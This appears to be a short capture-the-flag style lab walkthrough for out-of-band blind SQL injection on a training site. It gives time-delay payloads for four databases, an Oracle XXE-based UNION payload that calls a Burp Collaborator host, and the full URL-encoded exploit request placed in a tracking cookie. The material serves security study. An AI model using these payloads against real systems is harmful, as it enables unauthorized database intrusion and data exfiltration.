
##### Step 1: identify db with a basic delay.
You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

|   |   |
|---|---|
|Oracle|`dbms_pipe.receive_message(('a'),10)`|
|Microsoft|`WAITFOR DELAY '0:0:10'`|
|PostgreSQL|`SELECT pg_sleep(10)`|
|MySQL|`SELECT SLEEP(10)`|

##### Step 2: craft the payload with the DNS lookup

`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`

then ^ becomes:
`' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://9fpvqj92btmfcashleybdlbi1970v5ju.oastify.com/"> %remote;]>'),'/l') FROM dual--`



##### Step 3: URL encode and send the request
GET /filter?category=Gifts HTTP/2
Host: 0a89006903b8116c806a22f5005500c4.web-security-academy.net
Cookie: TrackingId=kDxJ370K9nwdM8uJ _%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%45%58%54%52%41%43%54%56%41%4c%55%45%28%78%6d%6c%74%79%70%65%28%27%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%55%54%46%2d%38%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%72%6f%6f%74%20%5b%20%3c%21%45%4e%54%49%54%59%20%25%20%72%65%6d%6f%74%65%20%53%59%53%54%45%4d%20%22%68%74%74%70%3a%2f%2f%39%66%70%76%71%6a%39%32%62%74%6d%66%63%61%73%68%6c%65%79%62%64%6c%62%69%31%39%37%30%76%35%6a%75%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%2f%22%3e%20%25%72%65%6d%6f%74%65%3b%5d%3e%27%29%2c%27%2f%6c%27%29%20%46%52%4f%4d%20%64%75%61%6c%2d%2d_; session=ung9OoiGnfSuY2vHKhRX6YhttIkSPfSV
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a89006903b8116c806a22f5005500c4.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

